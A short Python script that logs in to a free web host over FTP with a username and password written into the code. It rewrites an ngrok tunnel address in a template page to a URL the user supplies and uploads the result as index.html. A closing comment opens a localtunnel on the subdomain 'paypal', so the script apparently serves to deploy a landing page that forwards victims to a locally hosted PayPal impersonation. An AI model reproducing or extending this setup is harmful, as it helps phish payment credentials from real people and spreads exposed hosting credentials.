import ftplib

FTP_HOST = "ftpupload.net"
FTP_USER = "ezyro_32621161"
FTP_PASS = "c4o8a7djlqba"

# connect to the FTP server
ftp = ftplib.FTP(FTP_HOST, FTP_USER, FTP_PASS)
# force UTF-8 encoding
ftp.encoding = "utf-8"

new = input()

fin = open("beginpage/index.html", "rt")

fout = open("index.html", "wt")

for line in fin:
	#read replace the string and write to output file
	fout.write(line.replace('http://8.tcp.ngrok.io:10585', new))
#close input and output files
fin.close()
fout.close()


filename = "index.html"
with open(filename, "rb") as file:
    # use FTP's STOR command to upload the file
    ftp.storbinary(f"STOR htdocs/{filename}", file)


#lt --port 5000 --subdomain paypal